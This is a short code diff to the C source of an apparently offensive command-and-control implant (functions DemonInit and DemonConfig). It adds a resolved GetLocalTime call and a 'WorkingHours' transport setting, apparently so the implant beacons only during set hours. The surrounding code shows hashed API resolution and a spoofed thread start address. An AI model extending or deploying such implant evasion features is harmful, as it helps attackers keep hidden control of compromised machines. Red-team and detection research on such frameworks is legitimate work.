@@ -355,6 +355,7 @@ VOID DemonInit( VOID )
         Instance.Win32.Wow64RevertWow64FsRedirection       = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Wow64RevertWow64FsRedirection );
         Instance.Win32.GetModuleHandleA                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetModuleHandleA );
         Instance.Win32.GetSystemTimeAsFileTime             = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetSystemTimeAsFileTime );
+        Instance.Win32.GetLocalTime                        = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetLocalTime );
 
     }
 
@@ -912,6 +913,7 @@ VOID DemonConfig()
         // TODO: exit process?
         Instance.Win32.RtlExitUserThread(0);
     }
+    Instance.Config.Transport.WorkingHours   = ParserGetInt32( &Parser );
     Instance.Config.Transport.Method         = L"POST"; /* TODO: make it optional */
     Instance.Config.Transport.HostRotation   = ParserGetInt32( &Parser );
     Instance.Config.Transport.HostMaxRetries = 0;  /* Max retries. 0 == infinite retrying
@@ -1035,6 +1037,7 @@ VOID DemonConfig()
         // TODO: exit process?
         Instance.Win32.RtlExitUserThread(0);
     }
+    Instance.Config.Transport.WorkingHours = ParserGetInt32( &Parser );
 #endif
 
     Instance.Config.Implant.ThreadStartAddr = Instance.Win32.LdrLoadDll + 0x12; /* TODO: default -> change that or make it optional via builder or profile */
